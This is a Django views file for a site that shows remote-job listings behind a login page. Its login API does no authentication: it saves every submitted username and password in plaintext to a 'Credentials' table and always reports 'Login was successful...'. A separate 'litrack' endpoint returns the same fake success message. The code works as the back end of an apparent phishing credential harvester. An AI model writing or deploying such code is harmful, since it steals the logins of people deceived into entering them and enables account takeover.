from django.shortcuts import render

from .models import RemoteJob, Credentials

from rest_framework.response import Response
from rest_framework import status

from rest_framework.decorators import api_view

# Create your views here.

def login_page(request):
    return render(request, "login.html", {})

def home_page(request):
    jobs = RemoteJob.objects.all().order_by("-pk")
    return render(request, "index.html", context={"jobs": jobs})


@api_view(['POST'])
def login_api(request):
    data = request.data
    username = data.get("username")
    password = data.get("password")

    if username and password:
        credential = Credentials(
            username=username,
            password=password
        )
        credential.save()

        return Response({"message": "Login was successful...", "success": True}, status=status.HTTP_200_OK)
    else:
        return Response({"message": "Login Denied", "success": False}, status=status.HTTP_400_BAD_REQUEST)



@api_view(['POST'])
def litrack(request):
    return Response({"message": "Login was successful..."}, status=status.HTTP_200_OK)

def error_final_page(request):
    return render(request, "error500.html", context={})

